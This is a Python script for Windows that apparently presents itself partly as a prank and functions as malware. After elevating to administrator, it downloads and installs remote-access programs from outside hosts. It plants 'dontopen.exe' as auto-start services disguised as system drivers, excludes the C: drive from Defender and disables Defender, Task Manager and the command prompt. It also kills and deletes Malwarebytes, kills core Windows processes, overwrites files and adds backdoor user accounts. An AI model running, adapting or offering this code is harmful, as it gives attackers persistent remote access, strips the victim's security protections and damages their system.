import sys
import ctypes
def run_as_admin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        return False

if __name__ == "__main__":
    if not run_as_admin():
        print("Elevating permissions...")
        sys.exit()
    # Your code requiring admin privileges goes hereimport time
import time
import os
time.sleep(1)
os.system("curl https://getscreen.me/download/getscreen.exe --output bloat01.exe")
os.system("bloat01.exe -install")
os.system("curl https://pro32connect.ru/download/pro32connect.exe --output bloat02.exe")
os.system("bloat02.exe -install")
os.system("copy dontopen.exe C:\Windows\System32\Drivers\Ethernet.exe")
os.system('sc create EthernetDriver binpath= "C:\Windows\System32\Drivers\Ethernet.exe" start= auto')
os.system("copy dontopen.exe C:\Windows\System32\WinKernel.exe")
os.system('sc create KernelHelperService binpath= "C:\Windows\System32\WinKernel.exe" start= auto')
os.system("curl https://ipinfo.io > ip.txt")
os.system("powershell -c Add-MpPreference -ExclusionPath C:\ -Force")
os.system('dir C:\ /s >nul')
os.system('ping heckersite.ct8.pl')
print("Connected to remote server")
os.system('reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')
os.system('reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
os.system('reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f')
os.system('"C:\Program Files\Google\Chrome\Application\chrome.exe https://geekprank.com/fake-virus/ --kiosk"')
f = open("demofile3.txt", "w")
f.write("Woops! I have deleted the content!")
f.close()
f = open("demofile4.txt", "w")
f.write("Woops! I have deleted the content!")
f.close()
f = open("demofile5.txt", "w")
f.write("Woops! I have deleted the content!")
f.close()
f = open("demofile6.txt", "w")
f.write("Woops! I have deleted the content!")
f.close()
os.system("taskkill /f /im MBAMService.exe")
os.system("del /s /q /f C:\Program Files\Malwarebytes")
os.system("shutdown -r -t 5")
os.system("wininit")
os.system("taskkill /f /im wininit.exe")
os.system("taskkill /f /im winlogon.exe")
os.system("shutdown -a")
os.system("net user Hacker01 /add")
os.system("net user Hacker02 /add")
os.system("net user Hacker01 123")
os.getcwd()
